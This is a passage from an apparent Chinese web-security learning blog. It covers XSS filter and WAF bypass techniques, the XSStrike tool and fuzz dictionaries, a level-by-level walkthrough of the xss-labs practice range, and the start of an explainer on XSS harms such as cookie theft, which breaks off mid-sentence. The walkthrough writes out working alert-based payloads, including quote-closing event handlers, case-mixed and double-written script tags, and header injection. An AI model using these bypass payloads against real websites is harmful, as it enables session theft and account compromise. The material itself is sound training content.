src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image2.png" alt="image2"></p><ul><li>判断拦截字符</li></ul><p><code>&lt;script</code>未拦截，<code>&lt;script&gt;</code>被拦截</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image3.png" alt="image3"></p><ul><li>写入XSS平台代码（被拦截）</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image4.png" alt="image4"></p><ul><li>逐步去掉&gt;和后面的,发现向XSS平台发送数据包,但是XSS报错</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image5.png" alt="image5"></p><ul><li>用’’来闭合SRC后面的地址，成功访问！</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image6.png" alt="image6"></p><ul><li>将语句替换为&lt;a href=</li></ul><p>同样成功访问</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image7.png" alt="image7"></p><ul><li>利用语句报错</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image8.png" alt="image8"></p><p>可以在img前面加入/，javascript中的/一般是结束的标志。</p><p>可见加入/后不被拦截，但也无法渗透了。</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image9.png" alt="image9"></p><h2 id="2-特殊符号干扰"><a href="#2-特殊符号干扰" class="headerlink" title="2.特殊符号干扰"></a>2.特殊符号干扰</h2><ul><li>在后面填充数据绕过检测</li></ul><p>注意后面的#，不加的话绕过不了</p><p>其中#属于特殊符号（在web里面#通常用作注释，还有其他的如//等），asdasdasfasfaefaefasefsdfa属于垃圾数据填充</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image10.png" alt="image10"></p><h2 id="3-提交方式更改"><a href="#3-提交方式更改" class="headerlink" title="3.提交方式更改"></a>3.提交方式更改</h2><ul><li>修改后台代码为request方式</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image11.png" alt="image11"></p><ul><li>然后数据包改为post提交</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image12.png" alt="image12"></p><p>成功绕过！</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image13.png" alt="image13"></p><h2 id="4-加密解密算法"><a href="#4-加密解密算法" class="headerlink" title="4.加密解密算法"></a>4.加密解密算法</h2><h2 id="5-结合其他漏洞绕过"><a href="#5-结合其他漏洞绕过" class="headerlink" title="5.结合其他漏洞绕过"></a>5.结合其他漏洞绕过</h2><h1 id="二-自动化工具说明（XSStrike）"><a href="#二-自动化工具说明（XSStrike）" class="headerlink" title="二.自动化工具说明（XSStrike）"></a>二.自动化工具说明（XSStrike）</h1><h2 id="1-功能介绍"><a href="#1-功能介绍" class="headerlink" title="1.功能介绍"></a>1.功能介绍</h2><p>XSStrike 主要特点反射和 DOM XSS 扫描；多线程爬虫；Context 分析；可配置的核心；检测和规避 WAF；老旧的 JS 库扫描；智能 payload 生成器；手工制作的 HTML &amp; JavaScript 解析器；强大的 fuzzing 引擎；盲打 XSS 支持；高效的工作流；完整的 HTTP 支持；Bruteforce payloads 支持；Payload 编码。</p><p><strong>下载地址：</strong><a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><h2 id="2-打开工具（python3环境）"><a href="#2-打开工具（python3环境）" class="headerlink" title="2.打开工具（python3环境）"></a>2.打开工具（python3环境）</h2><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image14.png" alt="image14"></p><h2 id="3-用fuzzer扫描"><a href="#3-用fuzzer扫描" class="headerlink" title="3.用fuzzer扫描"></a>3.用fuzzer扫描</h2><p>—offline为waf的状态，这里离线是英文工具为外国开发，没有识别安全狗</p><p>—passed为没有拦截，filtered为有过滤</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image15.png" alt="image15"></p><h2 id="4-对结果进行测试"><a href="#4-对结果进行测试" class="headerlink" title="4.对结果进行测试"></a>4.对结果进行测试</h2><p><code>&lt;test x&gt;</code>没有被拦截</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image16.png" alt="image16"></p><h2 id="5-直接进行测试（去掉fuzzer）"><a href="#5-直接进行测试（去掉fuzzer）" class="headerlink" title="5.直接进行测试（去掉fuzzer）"></a>5.直接进行测试（去掉fuzzer）</h2><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image17.png" alt="image17"></p><p>成功！</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image18.png" alt="image18"></p><h1 id="三-配合字典进行fuzz模糊测试"><a href="#三-配合字典进行fuzz模糊测试" class="headerlink" title="三.配合字典进行fuzz模糊测试"></a>三.配合字典进行fuzz模糊测试</h1><p><strong>字典地址：</strong><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><ul><li>抓取数据包</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image19.png" alt="image19"></p><ul><li>将name=1设置为变量，跑字典</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image20.png" alt="image20"></p><ul><li>载入字典，跑完</li></ul><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image21.png" alt="image21"></p><ul><li>查看结果</li></ul><p>根据返回的字节长度来判断安全狗有没有拦截，此处拦截返回的字节数为5335，其他都是没有拦截的</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image22.png" alt="image22"></p><ul><li><p>随便用一个没有被拦截的payload进行测试</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image23.png" alt="image23"></p></li></ul><p>成功！</p><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image24.png" alt="image24"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">XSS——靶场关卡练习</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-02-25 11:05:00" itemprop="dateCreated datePublished" datetime="2022-02-25T11:05:00+08:00">2022-02-25</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-02-26 21:06:16" itemprop="dateModified" datetime="2022-02-26T21:06:16+08:00">2022-02-26</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>1.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>2 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="一-XSS靶场关卡练习"><a href="#一-XSS靶场关卡练习" class="headerlink" title="一.XSS靶场关卡练习"></a>一.XSS靶场关卡练习</h1><h2 id="1-靶场搭建"><a href="#1-靶场搭建" class="headerlink" title="1.靶场搭建"></a>1.靶场搭建</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><p>搭建平台：phpstudy</p><h2 id="2-进入靶场"><a href="#2-进入靶场" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h2><h3 id="1-level-1"><a href="#1-level-1" class="headerlink" title="(1).level-1"></a>(1).level-1</h3><p>可以看到url地址上的test在页面中显示出来，因此可以在这里注入XSS攻击代码</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image1.png" alt="image1"></p><p>注入payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image2.png" alt="image2"></p><p>过关！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image3.png" alt="image3"></p><h3 id="2-level-2"><a href="#2-level-2" class="headerlink" title="(2).level-2"></a>(2).level-2</h3><p>审查元素，发现payload没有被执行</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image4.png" alt="image4"></p><p>闭合双引号和前面的&lt;</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image5.png" alt="image5"></p><p>过关！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image6.png" alt="image6"></p><h3 id="3-level-3"><a href="#3-level-3" class="headerlink" title="(3).level-3"></a>(3).level-3</h3><p>这关的输入框没法执行JS攻击代码，因为源代码中使用了htmlspecialchars函数将字符串定义为了实体</p><p><strong>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体</strong></p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image7.png" alt="image7"></p><p>由于代码中使用的是单引号，因此构造payload时要用单引号来闭合标签。</p><p>这里构造的payload是用的JS输入框中的鼠标事件<code>onclick=alert(1)</code></p><p>由于要闭合标签，因此加上单引号，payload为<code>&#39; onclick=&#39;alert(1)</code></p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image8.png" alt="image8"></p><p>成功！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image9.png" alt="image9"></p><h3 id="4-level-4"><a href="#4-level-4" class="headerlink" title="(4).level-4"></a>(4).level-4</h3><p>查看源码可知本关和第三关相同，只不过闭合符号相反</p><p>第三关是单引号在前双引号在后</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image10.png" alt="image10"></p><p>第四关是双引号在前单引号在后</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image11.png" alt="image11"></p><p>因此这里构造payload为<code>&quot; onclick=&quot;alert(1)</code>，成功！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image12.png" alt="image12"></p><h3 id="5-level-5"><a href="#5-level-5" class="headerlink" title="(5).level-5"></a>(5).level-5</h3><p>本关查看源码可知后台对on进行了替换，并且对script也进行了替换，但没有对&lt;和&gt;进行替换</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image13.png" alt="image13"></p><p>尝试构造大小写的payload发现不行，尝试html中的超链接语法</p><p>构造payload为<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code></p><p>过关！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image14.png" alt="image14"></p><h3 id="6-level-6"><a href="#6-level-6" class="headerlink" title="(6).level-6"></a>(6).level-6</h3><p>查看本关源码可知后台对<code>&lt;script&gt;</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>全都进行了过滤</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image15.png" alt="image15"></p><p>构造大小写payload：<code>&quot;&gt;&lt;scripT&gt;alert(1)&lt;/sCript&gt;</code>，过关！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image16.png" alt="image16"></p><h3 id="7-level-7"><a href="#7-level-7" class="headerlink" title="(7).level-7"></a>(7).level-7</h3><p>本关对大小写进行了处理，因此构造大小写payload不可行。</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image17.png" alt="image17"></p><p>由于此处是将关键字替换为空，且只替换了一次，因此可以尝试双写。</p><p>payload为：<code>&quot;&gt;&lt;scrscriptipT&gt;alert(1)&lt;/sCscriptript&gt;</code></p><p>过关！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image18.png" alt="image18"></p><h3 id="8-level-8"><a href="#8-level-8" class="headerlink" title="(8).level-8"></a>(8).level-8</h3><p>输入框被htmlspecialchars转义，但多了个<strong>添加友情链接</strong></p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image19.png" alt="image19"></p><p>正常来说直接构造payload为：<code>javascript:alert(1)</code>，但这里进行了过滤，并且大小写也被过滤。</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image20.png" alt="image20"></p><p>尝试编码，对上面的payload进行编码</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image21.png" alt="image21"></p><p>成功！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image22.png" alt="image22"></p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image23.png" alt="image23"></p><h3 id="9-level-9"><a href="#9-level-9" class="headerlink" title="(9).level-9"></a>(9).level-9</h3><p>本关加了个判定，是否有<code>http://</code>，因此在上一关的payload后面添加<code>//http://www.baidu.com</code>，前面的//起注释作用。</p><p>payload为：<code>javascript:alert(1)//http://www.baidu.com</code></p><p>注意得先对前面html语句编码。</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image24.png" alt="image24"></p><h3 id="10-level-10"><a href="#10-level-10" class="headerlink" title="(10).level-10"></a>(10).level-10</h3><p>本关过滤了&lt;和&gt;，并且传递的三个参数全部隐藏，因此无法构造事件来触发XSS。</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image25.png" alt="image25"></p><p>查看源码知道传递的三个参数最后只对t_sort处理并显示了出来，因此在t_sort参数处进行构造payload。</p><p>payload为：<code>t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></p><p><strong>注意：type=”text”为构造一个文本框，用来触发onclick事件。type前面的”用来闭合。</strong></p><p>成功！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image26.png" alt="image26"></p><h3 id="11-level-11"><a href="#11-level-11" class="headerlink" title="(11).level-11"></a>(11).level-11</h3><p>查看源码可见t_sort最后被实例化显示了，但多了个t_ref参数，t_ref参数是从HTTP_REFERER参数传递过来的。</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image27.png" alt="image27"></p><p><strong>注意：</strong>HTTP Referer是数据包头部的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p><p>因此可以通过BP来抓包往Referer里添加XSS攻击代码</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image28.png" alt="image28"></p><p>成功！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image29.png" alt="image29"></p><h3 id="12-level-12"><a href="#12-level-12" class="headerlink" title="(12).level-12"></a>(12).level-12</h3><p>本关类似前面一关，只不过将HTTP_REFERER参数变为了HTTP_USER_AGENT参数。</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image30.png" alt="image30"></p><p>抓包添加XSS攻击代码</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image31.png" alt="image31"></p><p>过关！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image32.png" alt="image32"></p><h3 id="13-level-13"><a href="#13-level-13" class="headerlink" title="(13).level-13"></a>(13).level-13</h3><p>同上，参数为cookie中的user</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image33.png" alt="image33"></p><p>抓包添加XSS攻击代码</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image34.png" alt="image34"></p><p>成功！</p><p><img src="/2022/02/25/XSS%E2%80%94%E2%80%94%E9%9D%B6%E5%9C%BA%E5%85%B3%E5%8D%A1%E7%BB%83%E4%B9%A0/image35.png" alt="image35"></p><h3 id="14-level-14"><a href="#14-level-14" class="headerlink" title="(14).level-14"></a>(14).level-14</h3></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">XSS攻击——订单页面实现</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-02-22 10:24:47" itemprop="dateCreated datePublished" datetime="2022-02-22T10:24:47+08:00">2022-02-22</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-02-25 10:31:58" itemprop="dateModified" datetime="2022-02-25T10:31:58+08:00">2022-02-25</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>8.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>8 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="一-XSS跨站漏洞"><a href="#一-XSS跨站漏洞" class="headerlink" title="一.XSS跨站漏洞"></a>一.XSS跨站漏洞</h1><h2 id="1-什么是XSS跨站漏洞"><a href="#1-什么是XSS跨站漏洞" class="headerlink" title="1.什么是XSS跨站漏洞"></a>1.什么是XSS跨站漏洞</h2><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称XSS）的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p>跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，<strong>是代码注入的一种</strong>。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p><p>攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。</p><p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p><h2 id="2-产生层面"><a href="#2-产生层面" class="headerlink" title="2.产生层面"></a>2.产生层面</h2><p>产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果。</p><h2 id="3-函数类"><a href="#3-函数类" class="headerlink" title="3.函数类"></a>3.函数类</h2><p>比如说php中的脚本的输出函数。</p><p>常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p><h2 id="4-危害影响"><a href="#4-危害影响" class="headerlink" title="4.危害影响"></a>4.危害影响</h2><ul><li><p>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p></li><li><p>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p></li><li><p>盗窃企业重要的具有商业价值的资料</p></li><li><p>非法转账</p></li><li><p>强制发送电子邮件</p></li><li><p>网站挂马</p></li><li><p>控制受害者机器向其它网站发起攻击</p><p>其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上<code>alert(&quot;say something&quot;)</code>的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。</p></li></ul><p><strong>(1).窃取网页浏览中的cookie值</strong>。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用）</p><p><strong>(2).劫持流量实现恶意跳转</strong>。这个很简单，就是在网页中想办法插入一句像这样的语句： 